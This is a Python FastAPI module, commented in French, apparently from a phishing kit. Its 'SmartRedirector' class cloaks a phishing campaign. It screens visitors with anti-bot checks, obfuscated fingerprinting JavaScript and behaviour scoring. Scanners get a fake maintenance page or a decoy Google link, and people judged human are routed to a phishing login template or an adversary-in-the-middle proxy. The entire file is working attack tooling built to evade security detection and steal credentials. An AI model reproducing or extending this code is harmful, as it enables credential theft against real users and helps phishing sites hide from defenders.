from typing import Dict, Optional, Any
from fastapi import Request, HTTPException, status
from fastapi.responses import RedirectResponse, HTMLResponse
from core.redirect.antibot import antibot
from core.redirect.fingerprint import fp_validator, BrowserFingerprint
from core.session.session_manager import session_manager
from core.cache.redis_manager import redis_cache
from core.security.behavior import behavior_engine
import os

class SmartRedirector:
    """
    Moteur de Redirection Intelligent (Tier 2 Logic)
    Gère le filtrage du trafic et la redirection dynamique vers le Core ou le Blackhole.
    """
    
    DECOY_URL = "https://www.google.com/search?q=security+scan"
    MAINTENANCE_TEMPLATE = "core/web/templates/maintenance.html"
    
    def __init__(self, use_antibot: bool = True):
        self.use_antibot = use_antibot
        self.antibot = antibot
        self.fp_validator = fp_validator
        self.behavior_engine = behavior_engine
        self.session_manager = session_manager
        self.template_path = "core/web/templates/redirect.html"
        self.js_path = "core/assets/js/fingerprint_collector.js"
    
    async def process_request(self, request: Request, target_campaign_id: str):
        """
        Traite la requête entrante, vérifie les bots, et sert la page de loading/fingerprinting.
        """
        # Support Tiered Infrastructure (X-Forwarded-For)
        forwarded_for = request.headers.get("x-forwarded-for")
        if forwarded_for:
            client_ip = forwarded_for.split(",")[0].strip()
        else:
            client_ip = request.client.host
            
        user_agent = request.headers.get("user-agent", "")
        
        # 1. Vérification Anti-Bot (Basic IP/UA)
        if self.use_antibot:
            check_result = await self.antibot.check_request(request)
            
            if check_result["blocked"]:
                print(f"[ANTIBOT] Bloqué: {check_result['reason']} (IP: {client_ip})")
                return self._serve_maintenance_page()
        
        # 2. Création de Session (Valid Visitor)
        session_id = self.session_manager.create_session(
            campaign_id=target_campaign_id,
            client_ip=client_ip,
            user_agent=user_agent
        )
        
        # 3. Servir la page de redirection (Fingerprinting)
        try:
            with open(self.template_path, "r") as f:
                content = f.read()
            
            # Injection du JS de fingerprinting (via endpoint polymorphique)
            # Au lieu d'injecter le contenu statique, on injecte une balise <script> pointant vers notre endpoint dynamique
            # Mais pour éviter les blocages, on peut aussi l'injecter inline obfusqué.
            # Pour la furtivité maximale (phase 4), on utilise l'endpoint dynamique.
            js_url = f"/v5/assets/js/fp_{session_id}.js"
            js_tag = f'<script src="{js_url}"></script>'
            
            # Injection des IDs et du JS tag
            content = content.replace("{{ campaign_id }}", target_campaign_id)
            content = content.replace("{{ session_id }}", session_id)
            # Remplacer le placeholder de contenu JS par le tag script externe
            content = content.replace("/* {{ fingerprint_js }} */", "") 
            # Injecter le script tag dans le head ou body via une autre méthode si nécessaire
            # Mais le template redirect.html attend du contenu JS inline.
            # Modifions l'approche: on récupère le contenu via l'obfuscateur ici même.
            
            from core.security.obfuscator import js_obfuscator
            try:
                with open(self.js_path, "r") as f:
                    raw_js = f.read()
                obfuscated_js = js_obfuscator.obfuscate(raw_js)
            except Exception as e:
                print(f"[SmartRedirect Warning] JS obfuscation failed: {e}")
                obfuscated_js = "// JS Error"

            content = content.replace("/* {{ fingerprint_js }} */", obfuscated_js)
            
            return HTMLResponse(content=content, status_code=200)
        except FileNotFoundError:
            # Fallback si template manquant
            print(f"[SmartRedirect Warning] Template {self.template_path} not found.")
            return self._get_final_destination(target_campaign_id, session_id)

    def _serve_maintenance_page(self):
        """Sert une page de maintenance réaliste au lieu d'une simple redirection."""
        try:
            with open(self.MAINTENANCE_TEMPLATE, "r") as f:
                content = f.read()
            return HTMLResponse(content=content, status_code=503)
        except FileNotFoundError:
            return RedirectResponse(url=self.DECOY_URL, status_code=status.HTTP_302_FOUND)


    async def verify_fingerprint(self, session_id: str, fingerprint_data: Dict[str, Any], campaign_id: str):
        """
        Valide le fingerprint reçu et retourne la destination finale.
        """
        try:
            # Validation structurelle et logique
            fp = BrowserFingerprint(**fingerprint_data)
            is_human = self.fp_validator.validate(fp)
            
            # Behavioral Analysis (Power/Stealth 1000/100)
            interaction = fingerprint_data.get("interaction", {})
            behavior_score = self.behavior_engine.analyze_session(session_id, interaction)
            print(f"[BEHAVIOR] Session {session_id} Score: {behavior_score}/100")
            
            if not is_human or behavior_score < 20:
                reason = "Fingerprint Rejected" if not is_human else f"Low Behavior Score ({behavior_score})"
                print(f"[ANTIBOT] Blocked: {reason}")
                return {"redirect_to": self.DECOY_URL}
                
            # Validation réussie -> Destination finale
            return self._get_final_destination(campaign_id, session_id)
            
        except Exception as e:
            print(f"[SmartRedirect Error] Fingerprint validation failed: {e}")
            return {"redirect_to": self.DECOY_URL}

    def _get_final_destination(self, campaign_id: str, session_id: str):
        """Détermine l'URL finale (AiTM ou Template)"""
        campaign = redis_cache.get(f"campaign:{campaign_id}")
        redirect_to = f"/v5/phish/{campaign_id}/login?sid={session_id}" # Default to template
        
        if campaign and campaign.get("type") == "aitm":
            # AiTM Mode: Redirection vers le proxy avec le session_id
            redirect_to = f"/v5/p/{session_id}/"
            
        return {"redirect_to": redirect_to}

# Instance globale
smart_redirector = SmartRedirector()
